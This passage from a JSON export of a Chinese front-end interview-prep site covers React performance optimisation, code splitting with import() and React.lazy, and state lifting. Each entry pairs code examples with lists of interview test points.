} ,{ id:2 , name: 'haha' },{ id:3 , name: 'heihei' } ],\n            number:0,\n         }\n    }\n    handerClick = ()=>{\n        this.setState({ number:this.state.number + 1 })\n    }\n    render(){\n       const { list }:any = this.state\n       return <div>\n           <button onClick={ this.handerClick } >点击</button>\n           <NotUpdate>\n              {()=>(<ul>\n                    {\n                    list.map(item=>{\n                        console.log(1111)\n                        return <li key={ item.id }  >{ item.name }</li>\n                    })\n                    }\n                </ul>)}\n           </NotUpdate>\n           <NotUpdate>\n                <ChildrenComponent />\n           </NotUpdate>\n          \n       </div>\n    }\n}\n\n```\n\n```js\nconst NotUpdate = React.memo(({ children }:any)=> typeof children === 'function' ? children() : children ,()=>true)\n```\n\n![](https://static.ecool.fun//article/e783a08e-ba1e-4a70-8e26-d10811e847e1.awebp)\n\n没错，用的就是 `React.memo`，生成了阻断更新的隔离单元，如果我们想要控制更新，可以对 `React.memo` 第二个参数入手， `demo`项目中完全阻断的更新。\n\n### ④ ‘取缔’state，学会使用缓存。\n\n这里的取缔`state`，并完全不使用`state`来管理数据，而是善于使用`state`,知道什么时候使用,怎么使用。`react` 并不像 `vue` 那样响应式数据流。 在 `vue`中 有专门的`dep`做依赖收集，可以自动收集字符串模版的依赖项，只要没有引用的`data`数据， 通过 `this.aaa = bbb` ,在`vue`中是不会更新渲染的。因为 `aaa` 的`dep`没有收集渲染`watcher`依赖项。在`react`中，我们触发`this.setState` 或者 `useState`，只会关心两次`state`值是否相同，来触发渲染，根本不会在乎`jsx`语法中是否真正的引入了正确的值。\n\n#### 没有更新作用的state\n\n**有状态组件中**\n\n```js\nclass Demo extends React.Component{\n    state={ text:111 }\n    componentDidMount(){\n        const { a } = this.props\n         /* 我们只是希望在初始化,用text记录 props中 a 的值 */\n        this.setState({\n            text:a\n        })    \n    }\n    render(){\n        /* 没有引入text */\n       return <div>{'hello,world'}</div>\n    }\n}\n```\n\n如上例子中,`render`函数中并没有引入`text` ,我们只是希望在初始化的时候，用 `text` 记录 `props` 中 `a` 的值。我们却用 `setState` 触发了一次无用的更新。无状态组件中情况也一样存在，具体如下。\n\n**无状态组件中**\n\n```js\nfunction Demo ({ a }){\n    const [text , setText] = useState(111)\n    useEffect(()=>{\n        setText(a)\n    },[])\n    return <div>\n         {'hello,world'}\n    </div>\n}\n```\n\n#### 改为缓存\n\n**有状态组件中**\n\n在`class`声明组件中，我们可以直接把数据绑定给`this`上，来作为数据缓存。\n\n```js\nclass Demo extends React.Component{\n    text = 111\n    componentDidMount(){\n        const { a } = this.props\n        /* 数据直接保存在text上 */\n        this.text = a\n    }\n    render(){\n        /* 没有引入text */\n       return <div>{'hello,world'}</div>\n    }\n}\n```\n\n**无状态组件中**\n\n在无状态组件中, 我们不能往问`this`,但是我们可以用`useRef`来解决问题。\n\n```js\nfunction Demo ({ a }){\n    const text = useRef(111)\n    useEffect(()=>{\n        text.current = a\n    },[])\n    return <div>\n        {'hello,world'}\n    </div>\n}\n```\n\n### ⑤ useCallback回调\n\n`useCallback` 的真正目的还是在于缓存了每次渲染时 `inline callback` 的实例，这样方便配合上子组件的 `shouldComponentUpdate` 或者 `React.memo` 起到减少不必要的渲染的作用。对子组件的渲染限定来源与，对子组件`props`比较，但是如果对父组件的`callback`做比较，无状态组件每次渲染执行，都会形成新的`callback` ,是无法比较，所以需要对`callback`做一个 `memoize` 记忆功能，我们可以理解为`useCallback`就是 `callback`加了一个`memoize`。我们接着往下看👇👇👇。\n\n```js\nfunction demo (){\n    const [ number , setNumber ] = useState(0)\n    return <div>  \n        <DemoComponent  handerChange={ ()=>{ setNumber(number+1)  } } />\n    </div>\n}\n```\n\n或着\n\n```js\nfunction demo (){\n    const [ number , setNumber ] = useState(0)\n    const handerChange = ()=>{\n        setNumber(number+1) \n    }\n    return <div>  \n        <DemoComponent  handerChange={ handerChange } />\n    </div>\n}\n```\n\n无论是上述那种方式，`pureComponent` 和 `react.memo` 通过浅比较方式，只能判断每次更新都是新的`callback`，然后触发渲染更新。`useCallback`给加了一个记忆功能，告诉我们子组件，两次是相同的 `callback`无需重新更新页面。至于什么时候`callback`更改，就要取决于 `useCallback` 第二个参数。好的，将上述`demo`我们用 `useCallback` 重写。\n\n```js\nfunction demo (){\n    const [ number , setNumber ] = useState(0)\n    const handerChange = useCallback( ()=>{\n        setNumber(number+1) \n    },[])\n    return <div>  \n        <DemoComponent  handerChange={ handerChange } />\n    </div>\n}\n```\n\n这样 `pureComponent` 和 `react.memo` 可以直接判断是`callback`没有改变，防止了不必要渲染。\n\n## 七 中规中矩的使用状态管理\n\n无论我们使用的是`redux`还是说 `redux` 衍生出来的 `dva` ,`redux-saga`等,或者是`mobx`，都要遵循一定'使用规则'，首先让我想到的是，**什么时候用状态管理**，**怎么合理的应用状态管理**，接下来我们来分析一下。\n\n### 什么时候使用状态管理\n\n要问我什么时候适合使用状态状态管理。我一定会这么分析，首先状态管理是为了解决什么问题，状态管理能够解决的问题主要分为两个方面，一 就是解决跨层级组件通信问题 。二 就是对一些全局公共状态的缓存。\n\n我们那redux系列的状态管理为例子。\n\n我见过又同学这么写的\n\n#### 滥用状态管理\n\n```tsx\n/* 和 store下面text模块的list列表，建立起依赖关系，list更新，组件重新渲染 */\n@connect((store)=>({ list:store.text.list }))\nclass Text extends React.Component{\n    constructor(prop){\n        super(prop)\n    }\n    componentDidMount(){\n        /* 初始化请求数据 */\n        this.getList()\n    }\n    getList=()=>{\n        const { dispatch } = this.props\n        /* 获取数据 */\n        dispatch({ type:'text/getDataList' })\n    }\n    render(){\n        const { list } = this.props\n        return <div>\n            {\n                list.map(item=><div key={ item.id } >\n                    { /*  做一些渲染页面的操作....  */ }\n                </div>)\n            }\n            <button onClick={ ()=>this.getList() } >重新获取列表</button>\n        </div>\n    }\n}\n```\n\n这样页面请求数据，到数据更新，全部在当前组件发生，这个写法我不推荐，此时的数据走了一遍状态管理,最终还是回到了组件本身，显得很鸡肋，并没有发挥什么作用。在性能优化上到不如直接在组件内部请求数据。\n\n#### 不会合理使用状态管理\n\n还有的同学可能这么写。\n\n```js\nclass Text extends React.Component{\n    constructor(prop){\n        super(prop)\n        this.state={\n            list:[],\n        }\n    }\n    async componentDidMount(){\n        const { data , code } = await getList()\n        if(code === 200){\n            /*  获取的数据有可能是不常变的，多个页面需要的数据  */\n            this.setState({\n                list:data\n            })\n        }\n    }\n    render(){\n        const { list } = this.state\n        return <div>\n            { /*  下拉框 */ }\n            <select>\n               {\n                  list.map(item=><option key={ item.id } >{ item.name }</option>) \n               }\n            </select>\n        </div>\n    }\n}\n```\n\n对于不变的数据，多个页面或组件需要的数据，为了避免重复请求,我们可以将数据放在状态管理里面。\n\n### 如何使用状态管理\n\n#### 分析结构\n\n我们要学会分析页面，那些数据是不变的，那些是随时变动的，用以下`demo`页面为例子：\n\n![](https://static.ecool.fun//article/775e1b7c-2535-4d82-a166-196d10ee63e8.awebp)\n\n如上 红色区域，是基本不变的数据，多个页面可能需要的数据，我们可以统一放在状态管理中，蓝色区域是随时更新的数据，直接请求接口就好。\n\n#### 总结\n\n**不变的数据，多个页面可能需要的数据，放在状态管理中，对于时常变化的数据，我们可以直接请求接口**\n\n## 八 海量数据优化-时间分片，虚拟列表\n\n### 时间分片\n\n时间分片的概念，就是一次性渲染大量数据，初始化的时候会出现卡顿等现象。我们必须要明白的一个道理，**js执行永远要比dom渲染快的多。** ，所以对于大量的数据，一次性渲染，容易造成卡顿，卡死的情况。我们先来看一下例子\n\n```js\nclass Index extends React.Component<any,any>{\n    state={\n       list: []\n    }\n    handerClick=()=>{\n       let starTime = new Date().getTime()\n       this.setState({\n           list: new Array(40000).fill(0)\n       },()=>{\n          const end =  new Date().getTime()\n          console.log( (end - starTime ) / 1000 + '秒')\n       })\n    }\n    render(){\n        const { list } = this.state\n        console.log(list)\n        return <div>\n            <button onClick={ this.handerClick } >点击</button>\n            {\n                list.map((item,index)=><li className=\"list\"  key={index} >\n                    { item  + '' + index } Item\n                </li>)\n            }\n        </div>\n    }\n}\n```\n\n我们模拟一次性渲染 40000 个数据的列表，看一下需要多长时间。\n\n![](https://static.ecool.fun//article/ba01459c-5f59-426e-96d3-71e6857b68c0.awebp)\n\n我们看到 40000 个 简单列表渲染了，将近5秒的时间。为了解决一次性加载大量数据的问题。我们引出了时间分片的概念，就是用`setTimeout`把任务分割，分成若干次来渲染。一共40000个数据，我们可以每次渲染100个， 分次400渲染。\n\n```js\nclass Index extends React.Component<any,any>{\n    state={\n       list: []\n    }\n    handerClick=()=>{\n       this.sliceTime(new Array(40000).fill(0), 0)\n    }\n    sliceTime=(list,times)=>{\n        if(times === 400) return \n        setTimeout(() => {\n            const newList = list.slice( times , (times + 1) * 100 ) /* 每次截取 100 个 */\n            this.setState({\n                list: this.state.list.concat(newList)\n            })\n            this.sliceTime( list ,times + 1 )\n        }, 0)\n    }\n    render(){\n        const { list } = this.state\n        return <div>\n            <button onClick={ this.handerClick } >点击</button>\n            {\n                list.map((item,index)=><li className=\"list\"  key={index} >\n                    { item  + '' + index } Item\n                </li>)\n            }\n        </div>\n    }\n}\n```\n\n**效果**\n\n![](https://static.ecool.fun//article/ed660d4c-4409-47bb-83d8-0beef1ef281b.awebp)\n\n`setTimeout` 可以用 `window.requestAnimationFrame()` 代替，会有更好的渲染效果。 我们`demo`使用列表做的，实际对于列表来说，最佳方案是虚拟列表，而时间分片，更适合**热力图，地图点位比较多的情况**。\n\n### 虚拟列表\n\n笔者在最近在做小程序商城项目，有长列表的情况， 可是肯定说 **虚拟列表** 是解决长列表渲染的最佳方案。无论是小程序，或者是`h5` ，随着 `dom`元素越来越多，页面会越来越卡顿,这种情况在小程序更加明显 。稍后，笔者讲专门写一篇小程序长列表渲染缓存方案的文章，感兴趣的同学可以关注一下笔者。\n\n虚拟列表是按需显示的一种技术，可以根据用户的滚动，不必渲染所有列表项，而只是渲染可视区域内的一部分列表元素的技术。正常的虚拟列表分为 渲染区，缓冲区 ，虚拟列表区。\n\n如下图所示。\n\n![](https://static.ecool.fun//article/08730aff-ddd9-4a8e-94c3-ccea0ebd61af.awebp)\n\n为了防止大量`dom`存在影响性能，我们只对，渲染区和缓冲区的数据做渲染，，虚拟列表区 没有真实的dom存在。 缓冲区的作用就是防止快速下滑或者上滑过程中，会有空白的现象。\n\n#### react-tiny-virtual-list\n\nreact-tiny-virtual-list 是一个较为轻量的实现虚拟列表的组件。这是官方文档。\n\n```js\nimport React from 'react';\nimport {render} from 'react-dom';\nimport VirtualList from 'react-tiny-virtual-list';\n \nconst data = ['A', 'B', 'C', 'D', 'E', 'F', ...];\n \nrender(\n  <VirtualList\n    width='100%'\n    height={600}\n    itemCount={data.length}\n    itemSize={50} // Also supports variable heights (array or function getter)\n    renderItem={({index, style}) =>\n      <div key={index} style={style}> // The style property contains the item's absolute position\n        Letter: {data[index]}, Row: #{index}\n      </div>\n    }\n  />,\n  document.getElementById('root')\n);\n```\n\n#### 手写一个react虚拟列表\n\n```js\nlet num  = 0\nclass Index extends React.Component<any, any>{\n    state = {\n        list: new Array(9999).fill(0).map(() =>{ \n            num++\n            return num\n        }),\n        scorllBoxHeight: 500, /* 容器高度(初始化高度) */\n        renderList: [],       /* 渲染列表 */\n        itemHeight: 60,       /* 每一个列表高度 */\n        bufferCount: 8,       /* 缓冲个数 上下四个 */\n        renderCount: 0,       /* 渲染数量 */\n        start: 0,             /* 起始索引 */\n        end: 0                /* 终止索引 */\n    }\n    listBox: any = null\n    scrollBox : any = null\n    scrollContent:any = null\n    componentDidMount() {\n        const { itemHeight, bufferCount } = this.state\n        /* 计算容器高度 */\n        const scorllBoxHeight = this.listBox.offsetHeight\n        const renderCount = Math.ceil(scorllBoxHeight / itemHeight) + bufferCount\n        const end = renderCount + 1\n        this.setState({\n            scorllBoxHeight,\n            end,\n            renderCount,\n        })\n    }\n    /* 处理滚动效果 */\n    handerScroll=()=>{\n        const { scrollTop } :any =  this.scrollBox\n        const { itemHeight , renderCount } = this.state\n        const currentOffset = scrollTop - (scrollTop % itemHeight)\n        /* translate3d 开启css cpu 加速 */\n        this.scrollContent.style.transform = `translate3d(0, ${currentOffset}px, 0)`\n        const start = Math.floor(scrollTop / itemHeight)\n        const end = Math.floor(scrollTop / itemHeight + renderCount + 1)\n        this.setState({\n            start,\n            end,\n       })\n    }\n     /* 性能优化：只有在列表start 和 end 改变的时候在渲染列表 */\n    shouldComponentUpdate(_nextProps, _nextState){\n        const { start , end } = _nextState\n        return start !== this.state.start || end !==this.state.end \n    }\n    /* 处理滚动效果 */\n    render() {\n        console.log(1111)\n        const { list, scorllBoxHeight, itemHeight ,start ,end } = this.state\n        const renderList = list.slice(start,end)\n        return <div className=\"list_box\"\n            ref={(node) => this.listBox = node}\n        >   \n            <div  \n               style={{ height: scorllBoxHeight, overflow: 'scroll', position: 'relative' }}  \n               ref={ (node)=> this.scrollBox = node }\n               onScroll={ this.handerScroll }   \n            >\n                { /* 占位作用 */}\n                <div style={{ height: `${list.length * itemHeight}px`, position: 'absolute', left: 0, top: 0, right: 0 }} />\n                { /* 显然区 */ }\n                <div ref={(node) => this.scrollContent = node} style={{ position: 'relative', left: 0, top: 0, right: 0 }} >\n                    {\n                        renderList.map((item, index) => (\n                            <div className=\"list\" key={index} >\n                                {item + '' } Item\n                            </div>\n                        ))\n                    }\n                </div>\n            </div>\n\n        </div>\n    }\n}\n```\n\n**效果**\n\n![](https://static.ecool.fun//article/597191e7-f191-424a-98bd-3be054eecbb4.awebp)\n\n**具体思路**\n\n① 初始化计算容器的高度。截取初始化列表长度。这里我们需要div占位,撑起滚动条。\n\n② 通过监听滚动容器的 `onScroll`事件,根据 `scrollTop` 来计算渲染区域向上偏移量, 我们要注意的是，当我们向下滑动的时候，为了渲染区域，能在可视区域内，可视区域要向上的滚动; 我们向上滑动的时候，可视区域要向下的滚动。\n\n③ 通过重新计算的 `end` 和 `start` 来重新渲染列表。\n\n**性能优化点**\n\n① 对于移动视图区域，我们可以用 `transform` 来代替改变 `top`值。\n\n② 虚拟列表实际情况，是有 `start` 或者 `end` 改变的时候，在重新渲染列表，所以我们可以用之前 `shouldComponentUpdate` 来调优，避免重复渲染。",
    "testPoint": "### 1. **组件渲染优化**\n   - **考察点**：如何减少不必要的渲染，避免性能浪费。\n   - **问题示例**：\n     - 什么时候应该使用 `React.memo`？它的局限性是什么？\n     - `useMemo` 和 `useCallback` 的作用是什么？它们有什么区别？\n     - React 组件的 `key` 属性有什么作用？错误使用 `key` 会导致什么问题？\n     - 在 React 中，如何减少组件的重新渲染？有哪些方式？\n\n### 2. **状态管理优化**\n   - **考察点**：状态更新的合理性，如何避免不必要的 re-render。\n   - **问题示例**：\n     - 为什么频繁更新 `useState` 可能会影响性能？如何优化？\n     - `useReducer` 在什么场景下比 `useState` 更优？\n     - React 组件内部的状态应该如何设计，才能减少不必要的渲染？\n     - 全局状态（Redux、Context API）对性能有哪些影响？如何优化 Redux 相关性能问题？\n\n### 3. **Virtual DOM 及 Diff 算法**\n   - **考察点**：理解 React 的 Virtual DOM 及其工作原理，如何提升 DOM 更新效率。\n   - **问题示例**：\n     - React 是如何使用 Virtual DOM 进行渲染的？\n     - 介绍一下 React 的 Diff 算法，如何减少不必要的 DOM 更新？\n     - `shouldComponentUpdate` 在类组件中如何使用？它的替代方案是什么？\n\n### 4. **异步渲染 & 并发模式**\n   - **考察点**：React 18 的并发特性，以及如何避免阻塞主线程。\n   - **问题示例**：\n     - 什么是 React 18 的 Concurrent Mode，并发渲染如何提升性能？\n     - `useTransition` 的作用是什么？适用于哪些场景？\n     - `React.lazy` 和 `Suspense` 如何优化 React 应用的性能？\n     - 介绍一下 `useDeferredValue` 的作用，和 `useTransition` 的区别是什么？\n\n### 5. **列表渲染优化**\n   - **考察点**：长列表的渲染性能问题及优化策略。\n   - **问题示例**：\n     - 当列表数据量较大时，直接使用 `map` 渲染会有什么问题？如何优化？\n     - React 中如何实现虚拟列表（Virtual List）？常见的库有哪些？\n     - `windowing` 技术是如何提高 React 渲染性能的？\n     - `react-window` 和 `react-virtualized` 的核心原理是什么？\n\n### 6. **代码拆分与懒加载**\n   - **考察点**：按需加载、动态导入，减少首屏加载时间。\n   - **问题示例**：\n     - 在 React 中如何实现代码拆分？有哪些常见的方法？\n     - `React.lazy` 的工作原理是什么？和 `import()` 有什么关系？\n     - 如何配合 `Suspense` 进行懒加载？它的局限性是什么？\n     - 代码拆分后，如何处理多个异步加载组件的错误？\n\n### 7. **事件处理优化**\n   - **考察点**：事件绑定、事件代理、避免性能开销。\n   - **问题示例**：\n     - React 事件系统是如何工作的？事件代理有什么作用？\n     - 如何优化 React 事件绑定，避免事件过多导致的性能问题？\n     - `useCallback` 在事件处理函数中应该如何使用？什么时候会导致性能问题？\n     - 如何在 React 中实现全局事件监听，避免性能损耗？\n\n### 8. **SSR（服务器端渲染）优化**\n   - **考察点**：SSR 的渲染方式、影响以及优化手段。\n   - **问题示例**：\n     - 什么时候应该使用 Server-Side Rendering（SSR）？SSR 如何提升 React 应用的性能？\n     - 在 Next.js 中，`getServerSideProps` 和 `getStaticProps` 有什么区别？如何选择？\n     - React SSR 如何避免“水合（Hydration）”问题？\n     - React 18 中的 Streaming SSR 如何优化页面加载速度？\n\n### 9. **生产环境优化**\n   - **考察点**：构建优化、减少打包体积、提升加载速度。\n   - **问题示例**：\n     - 如何减少 React 应用的打包体积？\n     - `webpack` 如何优化 React 项目？Tree Shaking 和 Code Splitting 具体如何实现？\n     - 如何使用 PWA（渐进式 Web 应用）提升 React 应用的体验？\n     - 生产环境下如何分析 React 应用的性能瓶颈？",
    "exerciseKeyList": "[\"0e7888d9-d8a4-41f8-a052-f94350ee0c15\",\"060a3711-75a5-4bb3-bb18-9e6e358da4bf\"]",
    "vipLimit": 1,
    "level": 4,
    "pointOrder": 1,
    "createAt": "2024-12-17T09:53:00.000Z",
    "updateAt": "2025-03-20T01:27:09.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "060a3711-75a5-4bb3-bb18-9e6e358da4bf",
        "title": "在 React 中可以做哪些性能优化？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T12:22:19.000Z",
        "updateAt": "2024-08-10T17:05:05.000Z"
      },
      {
        "exerciseKey": "0e7888d9-d8a4-41f8-a052-f94350ee0c15",
        "title": "React有哪些性能优化的方法？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-10T07:03:29.000Z",
        "updateAt": "2024-08-10T17:05:41.000Z"
      }
    ]
  },
  "206": {
    "id": 206,
    "tagId": 13,
    "title": "代码分割",
    "explanation": "## 什么是代码分割\n\n代码分割是一种将代码分割成多个小块的方式，然后按需加载或并行加载所需的块的技术。代码分割可以用于减少应用程序的初始加载时间或将代码切割成可按需加载的块，从而减少应用程序所需的总体代码量。\n\n## 为什么要使用代码分割\n\n在大型应用程序中，将所有代码放在一个文件中会导致应用程序加载时间过长，影响用户体验。为了解决这个问题，我们需要将代码分割成小块，然后按需加载或并行加载所需的块。\n\n## 代码分割的方式\n\n### 1\\. 动态导入 import\n\nimport()是 JavaScript 中的一个动态导入语法，它允许在运行时异步加载模块。它返回一个 Promise，该 Promise 在模块加载完成后被解析为一个包含导出内容的模块对象。 使用 import()的语法如下：\n\n```js\nimport(modulePath)\n  .then((module) => {\n    // 使用导入的模块\n  })\n  .catch((error) => {\n    // 处理错误\n  });\n```\n\n在这个语法中，modulePath 是一个字符串，用于指定要加载的模块路径。它可以是相对路径或绝对路径，也可以是一个包名。 当调用 import(modulePath)时，它会返回一个 Promise。这个 Promise 会在模块加载完成后被解析为一个包含导出内容的模块对象。你可以使用.then()方法来处理解析后的模块对象，并在其中使用导入的模块。 如果模块加载失败，Promise 会被拒绝，并触发.catch()方法中的错误处理逻辑。\n\n> 注意事项 import()只能在模块的顶层作用域中使用，不能在函数内部或条件语句中使用。这是因为 import()是静态解析的，它在代码加载时就会执行，而不是在运行时。\n\n另外，import()可以与其他语法结合使用，例如动态模块路径和对象解构。 动态模块路径：\n\n```js\nconst modulePath = \"./myModule\";\n\nimport(modulePath)\n  .then((module) => {\n    // 使用导入的模块\n  })\n  .catch((error) => {\n    // 处理错误\n  });\n```\n\n在这个示例中，modulePath 是一个变量，它的值在运行时确定。这样可以根据需要动态加载不同的模块。\n\n对象解构：\n\n```js\nimport(\"./myModule\")\n  .then(({ myFunction, myVariable }) => {\n    // 使用导入的函数和变量\n    myFunction();\n    console.log(myVariable);\n  })\n  .catch((error) => {\n    // 处理错误\n  });\n```\n\n### 2\\. React.lazy\n\nReact.lazy 是 React 16.6 版本引入的一个特性，它可以让你以动态的方式进行代码拆分（code splitting）。通过 React.lazy，你可以延迟加载（lazy load）一个组件，只有在需要时才会加载该组件，从而提高应用程序的性能。 React.lazy 的用法如下：\n\n```js\nconst MyComponent = React.lazy(() => import(\"./MyComponent\"));\n```\n\n在这个例子中，MyComponent 是一个需要延迟加载的组件。import('./MyComponent')返回一个 Promise，该 Promise 在模块加载完成后会被解析为一个包含 MyComponent 的模块对象。React.lazy 接受一个函数作为参数，该函数返回一个动态导入的 Promise。当组件需要被渲染时，React.lazy 会自动加载该组件。 在使用 React.lazy 时，你还可以结合使用 Suspense 组件来处理加载状态。Suspense 组件可以包裹在延迟加载的组件周围，以便在组件加载期间显示一个回退（fallback）UI。 下面是一个使用 React.lazy 和 Suspense 的示例：\n\n```js\nimport React, { Suspense } from \"react\";\n\nconst MyComponent = React.lazy(() => import(\"./MyComponent\"));\n\nfunction App() {\n  return (\n    <div>\n      <Suspense fallback={<div>Loading...</div>}>\n        <MyComponent />\n      </Suspense>\n    </div>\n  );\n}\n\nexport default App;\n```\n\n在这个示例中，MyComponent 是一个需要延迟加载的组件。当 MyComponent 被渲染时，Suspense 组件会显示一个加载中的 UI（在这个例子中是一个简单的文本\"Loading...\"）。一旦 MyComponent 加载完成，它将被渲染到页面上。 使用 React.lazy 和 Suspense 可以帮助你更好地管理和优化你的 React 应用程序的性能，特别是在处理大型代码库时。\n\n::: warning 注意事项 React.lazy 只能用于默认导出的组件。如果你的组件使用了命名导出，你需要使用对象解构语法来导入特定的命名导出。 :::\n\n```js\nconst { MyComponent, AnotherComponent } = React.lazy(() =>\n  import(\"./MyComponent\")\n);\n```\n\n这样，你就可以按需加载具有命名导出的组件。\n\n### 3.路由（React Router）代码分割\n\nReact.lazy 和 Suspense 可以帮助你在组件级别上进行代码分割，但如果你想在路由级别上进行代码分割，你可以使用 React Router 的动态导入语法。\n\n下面是一个结合 React.lazy 和 React Router 的示例：\n\n```js\nimport React, { lazy, Suspense } from \"react\";\nimport { BrowserRouter as Router, Route, Switch } from \"react-router-dom\";\n\nconst Home = lazy(() => import(\"./Home\"));\nconst About = lazy(() => import(\"./About\"));\nconst Contact = lazy(() => import(\"./Contact\"));\n\nfunction App() {\n  return (\n    <Router>\n      <div>\n        <nav>\n          <ul>\n            <li>\n              <Link to=\"/\">首页</Link>\n            </li>\n            <li>\n              <Link to=\"/about\">关于</Link>\n            </li>\n            <li>\n              <Link to=\"/contact\">联系方式</Link>\n            </li>\n          </ul>\n        </nav>\n        <Suspense fallback={<div>加载中...</div>}>\n          <Switch>\n            <Route exact path=\"/\" component={Home} />\n            <Route path=\"/about\" component={About} />\n            <Route path=\"/contact\" component={Contact} />\n          </Switch>\n        </Suspense>\n      </div>\n    </Router>\n  );\n}\nexport default App;\n\n```\n\n在上面的例子中，我们将Home、About和Contact三个组件使用React.lazy进行了按需加载，然后通过React Router的Route组件将它们与特定的路由路径绑定起来。\n\n注意，在使用React.lazy时，您需要将懒加载的组件包裹在Suspense组件中。`div`组件用于在加载过程中展示一个占位符（在上面的例子中是`<div>`加载中...`</div>`），直到实际组件加载完成才会显示实际内容。\n\n总结来说，React.lazy提供了一种简便的方式来实现代码分割，从而提高应用程序的加载性能。您可以使用它来延迟加载组件，无论是单个组件还是整个路由。这对于大型应用程序特别有用，可以减少初始加载时的资源使用量。",
    "testPoint": "## **1. 代码分割的基本概念**\n- **考察点**：\n  - 代码分割的概念和作用。\n  - 代码分割如何优化性能，减少首屏加载时间。\n  \n- **问题示例**：\n  - 什么是代码分割（Code Splitting）？它的主要作用是什么？\n  - 代码分割如何优化 React 应用的性能？\n  - 代码分割与懒加载（Lazy Loading）有什么关系？\n  - 代码分割是否会影响 SEO？如何解决？\n\n---\n\n## **2. React 代码分割的实现方式**\n- **考察点**：\n  - `React.lazy` 和 `import()` 的工作原理。\n  - 代码分割的不同实现方式及适用场景。\n  \n- **问题示例**：\n  - 在 React 中如何实现代码分割？有哪些常见方式？\n  - `React.lazy` 是如何工作的？和 `import()` 的关系是什么？\n  - `React.lazy` 和 `Suspense` 是如何配合使用的？\n  - `Suspense` 是否支持服务器端渲染（SSR）？如何处理？\n  - 除了 `React.lazy`，你还知道哪些实现代码分割的方法？\n  - 代码分割和动态加载的区别是什么？\n\n---\n\n## **3. 代码分割与路由**\n- **考察点**：\n  - 路由级别的代码分割。\n  - 如何使用 React Router 进行按需加载。\n  \n- **问题示例**：\n  - 如何在 React Router 中实现路由级代码分割？\n  - 为什么推荐对路由组件进行代码分割？\n  - `React.lazy` 如何和 `React Router` 配合使用？\n  - 代码分割对路由跳转性能有哪些优化？\n  - 代码分割会影响路由切换的流畅度吗？如何优化？\n  \n---\n\n## **4. 代码分割与状态管理**\n- **考察点**：\n  - 代码分割后，如何处理全局状态管理（Redux、Context API）。\n  - 避免代码分割后导致的状态丢失或初始化问题。\n  \n- **问题示例**：\n  - 如果使用 Redux，代码分割后如何动态加载 reducers？\n  - 当使用 Context API 时，如何处理代码分割带来的上下文问题？\n  - 代码分割后，如何保证全局状态不会因懒加载组件而丢失？\n  - 在微前端架构中，代码分割如何与主应用的状态管理配合？\n\n---\n\n## **5. 代码分割的错误处理**\n- **考察点**：\n  - 如何优雅地处理代码分割导致的加载失败。\n  - `Suspense` 的 fallback 机制及替代方案。\n  \n- **问题示例**：\n  - 如果懒加载组件失败了，React 该如何处理？\n  - 如何为懒加载组件提供降级方案或错误提示？\n  - `Suspense` 的 `fallback` 机制是如何工作的？\n  - 你如何处理 `React.lazy` 加载失败的问题？（比如网络超时）\n  - `ErrorBoundary` 是否可以与 `React.lazy` 结合使用？\n\n---\n\n## **6. 代码分割与 Webpack 配合**\n- **考察点**：\n  - Webpack 对代码分割的支持。\n  - `splitChunks` 配置及优化策略。\n  \n- **问题示例**：\n  - Webpack 是如何支持代码分割的？\n  - Webpack `splitChunks` 插件的作用是什么？如何配置？\n  - 代码分割后，如何避免多个 chunk 之间的依赖冲突？\n  - 如何控制 Webpack 生成的 chunk 体积？\n  - 代码分割对 Webpack 热更新（HMR）有什么影响？\n  \n---\n\n## **7. 代码分割与服务端渲染（SSR）**\n- **考察点**：\n  - 代码分割对 SSR 的影响及解决方案。\n  - `loadable-components` 如何替代 `React.lazy`。\n  \n- **问题示例**：\n  - 为什么 `React.lazy` 不能直接用于 SSR？\n  - SSR 场景下，如何实现代码分割？\n  - `loadable-components` 和 `React.lazy` 的区别是什么？\n  - 你如何在 Next.js 中实现代码分割？\n  - 代码分割如何影响服务端渲染的 SEO？\n\n---\n\n## **8. 代码分割的性能分析与优化**\n- **考察点**：\n  - 如何评估代码分割对性能的影响。\n  - 代码分割的最佳实践，如何平衡首屏加载和交互体验。\n  \n- **问题示例**：\n  - 你如何分析代码分割的效果？有哪些工具可以使用？\n  - 如何在 React 项目中优化首屏加载时间？\n  - 为什么代码分割可能会导致页面白屏？如何优化？\n  - 如何减少代码分割带来的额外 HTTP 请求？\n  - 代码分割对 Lighthouse 评分有何影响？",
    "exerciseKeyList": "[\"eafdce6d-b42c-42b1-bfb5-f40947e6f5d8\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T09:57:24.000Z",
    "updateAt": "2025-03-20T01:33:56.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "eafdce6d-b42c-42b1-bfb5-f40947e6f5d8",
        "title": "在 React 中如何实现代码分割？有哪些常见方式？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2025-03-20T01:33:38.000Z",
        "updateAt": "2025-03-20T01:33:42.000Z"
      }
    ]
  },
  "207": {
    "id": 207,
    "tagId": 13,
    "title": "react 状态提升",
    "explanation": "在开始介绍状态提升之前，我想先介绍一下 Prop Drilling（属性钻取）的概念。\n\n## 什么是Prop Drilling ？\n\n那么，什么是状态提升呢？我们都知道 React 中的**prop drilling**（属性钻取）。**prop drilling**意味着从父组件向子组件传递一些 props。通过这种方式，我们可以在不同的组件之间共享数据或函数。可以使用 prop 传递任何类型的数据。\n\n![image.png](https://static.ecool.fun//article/5327186f-b548-4cc5-85c7-cb2a66c0351b.awebp)\n\n在上面的示例代码中，你可以看到，Home 组件具有一个名为 name 的状态，并且她与子组件共用 name 变量。在 React 中，只能将数据从父组件传递到子组件。\n\n![image.png](https://static.ecool.fun//article/73aea40a-5bfc-4f61-bc82-75520f8f10d8.awebp)\n\n## 什么是 State Lifting\n\n![image.png](https://static.ecool.fun//article/b5afe808-648b-496b-bd9c-90bbb57430c1.awebp)\n\n一般来说，状态提升允许你将数据从子组件移动到父组件，与Props Drilling不同，你可以在父组件使用子组件的状态值。这是不是很疯狂？\n\n> 在 React 生态中，我们知道数据只能从父组件流向子组件，但现在将学习如何让数据反过来流动。\n\n**但是，为什么要这么做？**\n\n我们可以在父组件中定义状态并将其以 prop 的方式传递给子组件，但是这么做有可能会导致性能损失和代码复杂度提升。在我之前的博客中有提到：保持状态本地化很重要。因为当状态更新时，组件以及该组件的子组件都会重新渲染。\n\n此外对于代码复杂性，对于如 Modal 